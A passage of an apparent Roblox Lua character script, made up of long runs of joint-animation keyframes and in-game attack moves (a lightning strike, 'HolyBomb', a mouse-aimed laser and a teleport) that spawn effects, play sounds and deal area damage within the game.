			RS.C0 = clerp(RS.C0,CFrame.new(1.17289495, 0.616719723+.1*M.C(Sine/12), 0.011598235, -0.52721566, -0.849588335, 0.0156120034, 0.849726856, -0.527186096, 0.00628500059, 0.0028907666, 0.0165794864, 0.999858379)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00954779983, 1.49905622, 0.00156322215, -1.82539225e-07, 0.0574940294, -0.998345554, 0.00628540665, 0.998326242, 0.0574929155, 0.999979854, -0.00627500098, -0.000361557119),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		for i = 0, 1.4, .1 do
			swait()
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.0109784482, 0.00629424211+.25*M.C(Sine/12), 0.00456619123, 0, 0.00628576428, 0.999979854, 0, 0.99998033, -0.00628576661, -0.999999702, -7.27595761e-12, 0)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.51089513, 0.618211091+.1*M.C(Sine/12), -0.00361234695, 0.982347131, 0.18641524, 0.0156120034, -0.186530694, 0.982429147, 0.00628500059, -0.0141660646, -0.0090861693, 0.999858379)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.39888549, 0.921575725+.1*M.C(Sine/12), 0.00929622632, -0.917422354, -0.397608638, 0.0156120034, 0.397739291, -0.917477012, 0.00628500059, 0.0118246814, 0.0119755063, 0.999858379)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00954779983, 1.49905622, 0.00156322215, -1.82539225e-07, 0.0574940294, -0.998345554, 0.00628540665, 0.998326242, 0.0574929155, 0.999979854, -0.00627500098, -0.000361557119),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		for i = 0, .8, .1 do
			swait()
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.0109784482, 0.00629424211+.25*M.C(Sine/12), 0.00456619123, 0, 0.00628576428, 0.999979854, 0, 0.99998033, -0.00628576661, -0.999999702, -7.27595761e-12, 0)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.51089513, 0.618211091+.1*M.C(Sine/12), -0.00361234695, 0.982347131, 0.18641524, 0.0156120034, -0.186530694, 0.982429147, 0.00628500059, -0.0141660646, -0.0090861693, 0.999858379)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.39452517, 0.577189744, 0.0083861379, 0.913589835, -0.406337589, 0.0156120034, 0.406289399, 0.913722992, 0.00628500059, -0.0168188754, 0.000601077918, 0.999858379)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00954779983, 1.49905622, 0.00156322215, -1.82539225e-07, 0.0574940294, -0.998345554, 0.00628540665, 0.998326242, 0.0574929155, 0.999979854, -0.00627500098, -0.000361557119),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end

		for i = 0, 6, .1 do
			pcall(function() Sound(Torso,481719045,1,1,false,true,true) end)
			local pos = CF.N(where)*CF.N(M.RNG(-1000,1000,100),0,M.RNG(-1000,1000,100))
			local part,rayPos,norm,dist = CastRay(pos*CF.N(0,500,0).p,pos.p,1500)
			Zap{
				StartCFrame=pos*CF.N(0,500,0),
				EndCFrame=CF.N(rayPos),
				ZapRotation = {-5,5},
				StartSize = 1,
				EndSize = .5,
				Delay=10,
				DelayInc=2,
			}
			AOEDamage(rayPos,5,45,65,0,'Electric',25,2)
			swait()
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.0109784482, 0.00629424211+.25*M.C(Sine/12), 0.00456619123, 0, 0.00628576428, 0.999979854, 0, 0.99998033, -0.00628576661, -0.999999702, -7.27595761e-12, 0)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.51089513, 0.618211091+.1*M.C(Sine/12), -0.00361234695, 0.982347131, 0.18641524, 0.0156120034, -0.186530694, 0.982429147, 0.00628500059, -0.0141660646, -0.0090861693, 0.999858379)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.39452517, 0.577189744, 0.0083861379, 0.913589835, -0.406337589, 0.0156120034, 0.406289399, 0.913722992, 0.00628500059, -0.0168188754, 0.000601077918, 0.999858379)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00954779983, 1.49905622, 0.00156322215, -1.82539225e-07, 0.0574940294, -0.998345554, 0.00628540665, 0.998326242, 0.0574929155, 0.999979854, -0.00627500098, -0.000361557119),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		Hum.AutoRotate = true
		Attack = false
		NeutralAnims = true
		Rooted = false
	end


	function HolyBomb()
		Attack = true
		Chat2("jajajajaja ez nooby")
		swait(60)
		Rooted = true
		NeutralAnims = false
		for i = 0, 6, 0.1 do
			swait()
			local Alpha = .05
			Zap{
				StartCFrame=CF.N(Root.CFrame.p)*CF.N(0,250,0),
				EndCFrame=CF.N(Root.CFrame.p),
				ZapRotation = {-15,15},
				Color=C3.N(1,1,0),
				StartSize = 1,
				EndSize = 1,
				Delay=5,
				DelayInc=1,
			}
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20455468e-13, 0.00629198179, 1.40559132e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.507250547, -0.110386491, -0.672860861, 0.999877751, -0.00782374945, 0.013510122, -9.81397825e-05, 0.862201095, 0.506566346, -0.0156116877, -0.506505728, 0.862094939),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.487759113, -0.105839849, -0.680253506, 0.999877751, -0.00782374945, 0.013510122, -9.81397825e-05, 0.862201095, 0.506566346, -0.0156116877, -0.506505728, 0.862094939),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.04961777, 0.162827805, -0.367515624, 0.65209949, -0.758071303, 0.00966797117, 0.478066534, 0.401272744, -0.781301916, 0.588403046, 0.514108539, 0.624078274),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.01012444, 0.107069746, -0.463154793, 0.633318067, 0.773830771, 0.00966686849, -0.478192717, 0.401122361, -0.781301916, -0.608473003, 0.490190029, 0.624078274),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(6.11957148e-06, 1.44927096, -0.405988753, 0.999999583, 7.24568963e-07, -6.8731606e-07, 6.33735908e-09, 0.684226215, 0.729269981, 1.00024045e-06, -0.729269683, 0.684225917),Alpha)
			WingFlutter()
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),.3)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),.3)
		end
		for i = 0, .8, 0.1 do
			swait()
			local Alpha = .3
			RJ.C0 = clerp(RJ.C0,CFrame.new(0.00439098151, 0.0666924566, 0.281248361, 0.999959052, 0.00860917568, -0.00265517179, -0.0086270012, 0.830053985, -0.557616353, -0.00259668194, 0.557616353, 0.830094337),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.497570813, -0.936474979, -0.0477344394, 0.999878109, -0.00782567263, 0.0135120051, -9.73803981e-05, 0.862202823, 0.506563246, -0.0156142879, -0.506502926, 0.862096965),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.497439325, -0.931922615, -0.0551193655, 0.999878109, -0.00782567263, 0.0135120051, -9.73803981e-05, 0.862202823, 0.506563246, -0.0156142879, -0.506502926, 0.862096965),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.30848432, 0.518583834, 0.0627421439, 0.758070946, 0.652100444, 0.0096699167, -0.401271075, 0.478066146, -0.781302929, -0.514110804, 0.588402867, 0.624077141),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.42235136, 0.462758094, -0.0433900952, 0.77383244, -0.633316636, 0.00966930948, 0.401121885, 0.478191316, -0.781302929, 0.49018833, 0.608476162, 0.624077141),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00874680094, 1.45278561, 0.153901845, 0.999851108, 0.0168225225, 0.00386164617, -0.014445669, 0.938051641, -0.346193999, -0.00944628194, 0.346086651, 0.938155115),Alpha)
		end
		delay(1, function()
			NeutralAnims = true
			Rooted = false
		end)
		local start = NewInstance("Part",Effects,{Anchored=true,CanCollide=false,Transparency=1,CFrame=Root.CFrame})
		Sound(Char,579687077,.5,2,false,true,true)
		Sound(Char,239000203,.75,2,false,true,true)
		for i = 1, 140 do
			AOEDamage(start.CFrame.p,95,1000,1000,0,'Normal',100,5)
			Effect{
				Effect='ResizeAndFade',
				Mesh={MeshType=Enum.MeshType.Sphere},
				Color=C3.N(1,1,0),
				Material=Enum.Material.Neon,
				CFrame=CF.N(start.CFrame.p)*CF.N(M.RNG(-75,75),M.RNG(-75,75),M.RNG(-75,75)),
				Frames=60,
				FXSettings={
					EndIsIncrement=true,
					EndSize=V3.N(.6,.6,.6)
				}
			}
			swait(1)
		end
		Attack = false
	end

	function Lazor()
		Rooted = true
		Attack = true
		Hum.AutoRotate=false
		NeutralAnims = false
		Chat2("idot die jajajajaja")
		--Effect{Effect='Resize',Mesh={MeshType=Enum.MeshType.FileMesh},Size=V3.N(1,1,1),CFrame=,Frames=60,FXSettings={EndSize=V3.N(4,4,4)}}
		local snd = Sound(Torso,705787045,1,1,true,false,false)
		for i = 0, 6, .1 do
			Effect{
				Effect='Fade',
				Color=BrickColor.new'New Yeller',
				Size=V3.N((i/2),(i/2),(i/2)),
				Material=Enum.Material.Neon,
				Mesh={MeshType=Enum.MeshType.Sphere},
				Frames=15,
				CFrame=RArm.CFrame*CF.N(0,-1.5,0),
				Sound=false
			}
			swait()
			Root.CFrame =Root.CFrame:lerp(CF.N(Root.CFrame.p,V3.N(Mouse.Hit.x,Root.CFrame.y,Mouse.Hit.z)),.1)
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.09520316, 0.319447398+.1*M.C(Sine/12), 0.380316556, 0.862274766, -0.50140965, 0.071203351, 0.413908899, 0.77874434, 0.471420079, -0.291823745, -0.377021939, 0.879029453)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.46309233, 0.634022355+.1*M.C(Sine/12), 0.0835287869, -0.816918671, -0.539614618, 0.203615591, -0.392316222, 0.261119068, -0.881989181, 0.422766358, -0.800395131, -0.425012559),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		snd:Play()
		for i = 0, 24, .1 do
			swait()
			Effect{
				Effect='Fade',
				Color=BrickColor.new'New Yeller',
				Size=V3.N(3,3,3),
				Material=Enum.Material.Neon,
				Mesh={MeshType=Enum.MeshType.Sphere},
				Frames=15,
				CFrame=RArm.CFrame*CF.N(0,-1.5,0),
			}
			if(Mouse.Target)then
				Zap{
					StartCFrame=RArm.CFrame*CF.N(0,-1.5,0),
					EndCFrame=Mouse.Hit,
					ZapRotation = {-5,5},
					PartCount=10,
					StartSize = .5,
					EndSize = .5,
					Color = C3.N(1,1,0),
					DelayInc=0,
					Delay =5,
				}
			end
			AOEDamage(Mouse.Hit.p,3,10,15,false,"Electric",25,2)
			Root.CFrame = Root.CFrame:lerp(CF.N(Root.CFrame.p,V3.N(Mouse.Hit.x,Root.CFrame.y,Mouse.Hit.z)),.1)
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.09520316, 0.319447398+.1*M.C(Sine/12), 0.380316556, 0.862274766, -0.50140965, 0.071203351, 0.413908899, 0.77874434, 0.471420079, -0.291823745, -0.377021939, 0.879029453)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.42641699, 0.76597631+.1*M.C(Sine/12), -0.207831383, 0.954205394, 0.219142094, 0.203637421, 0.275958538, -0.38200587, -0.881996989, -0.115491927, 0.897801638, -0.424986154),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		coroutine.wrap(function()
			for i = 1, 0,-.05 do
				snd.Volume = i
				swait()
			end
			snd:destroy()
		end)()
		Rooted = false
		Attack = false
		Hum.AutoRotate=true
		NeutralAnims = true
	end

	function Teleport()
		Rooted = true
		Attack = true
		Hum.AutoRotate=false
		NeutralAnims = false
		repeat swait() 
			Root.CFrame =Root.CFrame:lerp(CF.N(Root.CFrame.p,V3.N(Mouse.Hit.x,Root.CFrame.y,Mouse.Hit.z)),.1)
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.30013025, 0.503248096+.1*M.C(Sine/12), -0.596688211, 0.828000546, -0.560713708, -6.38549547e-10, 0.003524723, 0.00520492578, -0.999980271, 0.560702682, 0.827984214, 0.00628613681),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.27528536, 0.496638358+.1*M.C(Sine/12), -0.579756379, 0.810091436, 0.586290658, -1.40121659e-09, -0.00368550443, 0.00509234518, -0.999980271, -0.586279035, 0.810075462, 0.00628613681),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		until not S.UserInputService:IsKeyDown(Enum.KeyCode.Q)
		local p = Mouse.Hit.p

		--
		local circle = NewInstance("Part",Effects,{CFrame=Root.CFrame*CF.N(0,0,-2),Size=V3.N(.05,.05,.05),Transparency=1,Anchored=true,CanCollide=false})
		local decalF = NewInstance("Decal",circle,{Name='Front',Texture="rbxassetid://524002938",Color3=C3.N(1,1,0),Face=Enum.NormalId.Front,Transparency = 1})
		local decalB = NewInstance("Decal",circle,{Name='Back',Texture="rbxassetid://524002938",Color3=C3.N(1,1,0),Face=Enum.NormalId.Back,Transparency=1})
		local asd = CF.N(p,Root.Position)
		local circle2=circle:Clone()
		circle2.Parent = Effects
		circle2.CFrame = asd*CF.N(0,4,0)
		Root.Anchored = true
		for i = 0, 3, .1 do
			swait() 
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.21875513, 0.506383479+.1*M.C(Sine/12), -0.0979118943, 0.810091376, 0.586290598, 2.45534384e-08, -0.00368548767, 0.0050923666, -0.999980271, -0.586278975, 0.810075402, 0.00628614426),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.20952582, 0.499788254+.1*M.C(Sine/12), -0.0786797404, 0.828000546, -0.560713649, -2.55837147e-08, 0.0035247067, 0.00520494673, -0.999980271, 0.560702622, 0.827984214, 0.00628614519),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
			circle.Size = circle.Size + V3.N(.2,.2,0)
			circle2.Size = circle2.Size + V3.N(.2,.2,0)
			circle.Front.Transparency=1-(i/3)
			circle.Back.Transparency=1-(i/3)
			circle2.Front.Transparency=1-(i/3)
			circle2.Back.Transparency=1-(i/3)

			circle.CFrame=circle.CFrame*CF.A(0,0,M.R(5))
			circle2.CFrame=circle2.CFrame*CF.A(0,0,M.R(5))
		end
		Root.Anchored = true
		for i = 1, 3,.1 do
			Root.Anchored = true
			swait()
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.09520316, 0.319447398+.1*M.C(Sine/12), 0.380316556, 0.862274766, -0.50140965, 0.071203351, 0.413908899, 0.77874434, 0.471420079, -0.291823745, -0.377021939, 0.879029453)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.38953996, 0.579314649+.1*M.C(Sine/12), 0.00156672322, 0.963396549, -0.267624378, 0.0156119959, 0.267557263, 0.9635216, 0.0062854127, -0.0167246256, -0.0018782462, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
		end
		for i = 0, 2, .1 do
			swait()
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.00288401172, -0.186870754+.25*M.C(Sine/12), -0.184415281, 0.999970019, -0.00748212682, -0.00185852405, 0.00747100171, 0.880958676, 0.473134309, -0.00190276653, -0.473133981, 0.880988002)*CF.A(-M.R(10+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.455414772, -0.964986682, 0.0489092469, 0.999094486, 0.0300228745, 0.0301540364, -0.0396850631, 0.913133621, 0.405724436, -0.0153536471, -0.406553656, 0.913497925)*CF.A(0,M.R(2+7*M.C(Sine/12)),-M.R(2+7*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.544458926, -0.964868069, 0.0333667099, 0.999092519, 0.0301021822, 0.0301397741, -0.0397526845, 0.913105845, 0.405780286, -0.015305927, -0.406610161, 0.913473606)*CF.A(0,-M.R(2+7*M.C(Sine/12)),M.R(2+7*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.36389351, 0.578486085+.1*M.C(Sine/12), 0.180077106, -0.966345549, 0.257006437, -0.0111429691, 0.189922124, 0.683552086, -0.704759717, -0.173510939, -0.683157504, -0.709358692)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.36815977, 0.578247666+.1*M.C(Sine/12), 0.13745755, 0.960469842, -0.278161407, 0.0111425305, 0.189813495, 0.683640122, 0.704703569, -0.203638792, -0.674731433, 0.709414363)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
